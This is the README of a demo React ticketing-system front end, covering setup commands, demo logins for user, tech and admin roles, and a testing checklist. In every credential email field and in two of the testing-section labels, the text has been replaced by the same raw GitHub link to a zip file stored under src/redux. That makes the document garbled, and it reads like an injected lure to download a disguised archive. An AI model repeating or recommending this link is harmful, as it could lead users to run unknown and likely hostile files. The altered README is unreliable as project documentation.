## Project Overview

    -This project is demo project that mimics the ticketing system accurately -
    -Front end project - React, Router , Redux , Tailwind - Instead of backend, states and staic data is used
    -This project is created from scratch no part is copied from online github repos of ticketing system
    -The flow chart diagram is included

# Getting started

    - clone the repo
    - pull latest changes
    - in terminal execute command npm i
    - in terminal execute command npm start

# Credentials

    1. user
        email: https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip
        password: user

    2. tech
        email : https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip
        password : tech

    3. Admin
        email : https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip
        password : admin

# Testing

    https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip user:
        1. End user is able to login and register (stored in state)
        2. create a ticket (with optional file attachment) , add comment
        3. able to change status of ticket

    https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip Support:
        1. able to answer any assigned ticket with a file attachment
        2. tech role does not have access to create ticket or edit
        3. able to mark as close/resolve ticket
    c. Admin
        1. able to assign/change tech support to ticket (Dummy feature)
        2. able to close/resolve the ticket

    d. Negative testing is also done , try accessing /tickets without logging in
